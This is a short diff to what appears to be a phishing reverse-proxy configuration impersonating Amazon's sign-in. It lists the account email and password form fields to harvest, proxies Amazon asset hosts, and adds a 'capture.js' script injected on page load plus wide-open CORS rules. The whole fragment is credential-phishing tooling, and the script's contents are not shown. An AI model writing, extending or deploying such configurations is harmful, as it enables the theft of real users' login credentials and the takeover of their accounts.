@@ -27,6 +27,7 @@ credentials:
   - {type: "post_param", name: "create_account_email", regex: null}
   - {type: "post_param", name: "create_account_password", regex: null}
 injections:
+  - {type: "js", path: "/core/assets/js/capture.js", trigger: "load"}
   - trigger_path: "/ap/signin"
     position: "body_end"
     content: |
@@ -51,3 +52,7 @@ form_actions:
 bridges:
   - {prefix: "/_images/", target_host: "images-na.ssl-images-amazon.com", strip_prefix: true, cors: "allow_all"}
   - {prefix: "/_fls/", target_host: "fls-na.amazon.com", strip_prefix: true, cors: "allow_all"}
+cors:
+  mode: "allow_all"
+  methods: ["GET", "POST", "OPTIONS", "PUT", "DELETE"]
+  headers: ["*"]
